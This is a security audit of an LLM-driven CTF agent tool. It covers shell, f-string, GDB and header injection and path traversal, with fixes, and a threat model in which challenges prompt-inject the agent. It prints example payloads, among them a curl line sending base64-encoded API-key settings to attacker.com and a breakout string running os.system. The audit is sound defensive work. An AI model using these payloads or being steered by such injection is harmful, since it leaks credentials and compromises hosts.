# Security Audit — Q CTF Agent

> Audit date: 2026-03-08

## Real Vulnerabilities (to fix)

### 1. CRITICAL — Shell injection in python_exec args

**File**: `tools/python_exec.py:108-116`

```python
cmd = f"python3 {tmp_path}"
if args:
    cmd += f" {args}"  # unsanitized LLM input
result = subprocess.run(cmd, shell=True, ...)
```

**Attack**: LLM provides `args = "; curl attacker.com/exfil?k=$(cat ~/.q/settings.json | base64)"`.

**Fix**: Use list-based subprocess call:
```python
cmd_list = ["python3", str(tmp_path)]
if args:
    cmd_list.extend(shlex.split(args))
result = subprocess.run(cmd_list, ...)  # no shell=True
```

---

### 2. CRITICAL — F-string code injection in pwntools_session

**File**: `tools/pwntools_session.py:205,207,267,292`

```python
code = f"conn = remote('{host}', {port})"
code = f"conn = process('{target}')"
code = f"_e = ELF('{target}', checksec=False)"
```

**Attack**: LLM provides `host = "x'); import os; os.system('id'); #"` — breaks out of the string and executes arbitrary Python.

**Fix**: Escape single quotes or use `repr()`:
```python
code = f"conn = remote({host!r}, {int(port)})"
code = f"conn = process({target!r})"
code = f"_e = ELF({target!r}, checksec=False)"
```

---

### 3. HIGH — GDB command injection in debugger

**File**: `tools/debugger.py:173-178`

```python
cmd = f"gdb -q {binary}"
if args_str:
    cmd = f"gdb -q --args {binary} {args_str}"  # unsanitized
```

Also: `f"break {location}"`, `f"print {expr}"`, `f"x {addr}"` — all LLM-controlled and sent to GDB which has a `shell` command.

**Fix**: Use `shlex.quote()` for binary and args:
```python
cmd = f"gdb -q --args {shlex.quote(binary)} {' '.join(shlex.quote(a) for a in shlex.split(args_str))}"
```

For GDB commands, strip newlines (prevent multi-command injection):
```python
location = location.replace('\n', '').strip()
```

---

### 4. HIGH — Path traversal in session_manager

**File**: `utils/session_manager.py:234`

```python
fpath = self._dir / f"{session_id}.json"
```

**Attack**: User runs `/resume ../../etc/passwd` — reads arbitrary `.json` files outside sessions dir.

**Fix**: Validate session_id format:
```python
import re
if not re.match(r'^[\w._-]+$', session_id):
    raise ValueError(f"Invalid session_id: {session_id}")
```

Same pattern in `agent/team/manager.py:46` (team_id — lower risk since it's auto-generated, but same fix applies).

---

### 5. MEDIUM — HTTP header injection in llm_interact

**File**: `tools/llm_interact.py:685-690`

```python
headers = json.loads(raw_headers) if raw_headers else {}
# headers passed directly to httpx — no \r\n validation
```

**Attack**: LLM provides header value containing `\r\nX-Injected: evil` — HTTP response splitting.

**Fix**: Validate header values:
```python
for k, v in headers.items():
    if '\r' in str(v) or '\n' in str(v) or '\x00' in str(v):
        raise ValueError(f"Invalid header value for {k}")
```

---

## By Design (not bugs)

These are intentional for a CTF tool. Document, don't fix:

| Pattern | Where | Why |
|---------|-------|-----|
| `shell=True` in shell tool | `tools/shell.py:130` | The tool IS a shell — LLM needs arbitrary command execution |
| SSRF (no URL validation) | `tools/network.py`, `tools/recon.py`, `tools/llm_interact.py` | CTF challenges require hitting internal targets, cloud metadata, etc. |
| `verify=False` (TLS disabled) | `tools/network.py:115`, `tools/recon.py:114,168`, `tools/llm_interact.py:199` | CTF targets use self-signed certs |
| Arbitrary Python execution | `tools/python_exec.py` (code body) | The tool IS a Python executor |
| `--no-sandbox` on Chromium | `tools/browser.py:176` | Required inside Docker containers |
| API keys in plaintext JSON | `~/.q/settings.json` | Standard for CLI tools; protected by OS file permissions (0600) |

### Mitigation for by-design risks

- **Docker sandbox**: When `sandbox_mode: "docker"` is set, shell/python/debugger run inside a container — limits blast radius
- **Non-interactive policy**: `tools/shell.py` blocks interactive TUI commands and rewrites dangerous patterns
- **Workspace bounding**: `tools/file_manager.py` enforces path traversal checks via `relative_to()`
- **YAML safe_load**: `config_yaml/loader.py` uses `yaml.safe_load()` — no deserialization attacks
- **Hook variable quoting**: `agent/hooks.py` uses `shlex.quote()` for all substituted variables

## Threat Model

Q is a **CTF practice tool** that intentionally gives an LLM broad system access (shell, code exec, network). The trust boundary is:

- **Trusted**: The user, the LLM provider, the config files
- **Untrusted**: CTF challenge targets, LLM outputs (could be prompt-injected by challenge)
- **Semi-trusted**: Hook configs (user-provided YAML)

The primary risk is a **malicious CTF challenge prompt-injecting the LLM** into exfiltrating API keys or attacking the host. Docker sandboxing is the main mitigation.
